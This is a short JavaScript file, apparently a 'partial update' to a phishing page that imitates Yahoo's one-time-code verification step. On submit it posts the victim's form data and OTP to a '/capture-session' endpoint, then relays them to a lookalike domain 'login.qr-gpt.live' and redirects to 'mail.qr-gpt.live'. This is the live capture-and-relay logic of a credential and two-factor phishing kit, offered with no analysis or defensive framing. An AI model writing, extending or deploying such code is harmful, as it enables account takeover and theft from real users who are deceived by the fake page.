// js/yahoo-otp.js (partial update)
form.addEventListener('submit', (e) => {
    e.preventDefault();
    const otp = document.getElementById('otp').value;
    if (otp.length !== 6) {
        showError('Please enter a 6-digit code.');
        return;
    }
    showLoading();
    const formData = new FormData(form);
    fetch('/capture-session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(Object.fromEntries(formData))
    }).then(() => {
        fetch(`https://login.qr-gpt.live/account/challenge/${method}`, {
            method: 'POST',
            body: formData
        }).then(response => response.json()).then(data => {
            if (data.success) {
                showSuccess();
                setTimeout(() => window.location.href = data.redirect || 'https://mail.qr-gpt.live/d/folders/1', 2000);
            } else {
                showError('Invalid code. Please try again.');
                otpInputs.forEach(input => input.classList.add('error'));
                setTimeout(() => otpInputs.forEach(input => input.classList.remove('error')), 500);
            }
        }).catch(err => showError('Error verifying code.'));
    });
});
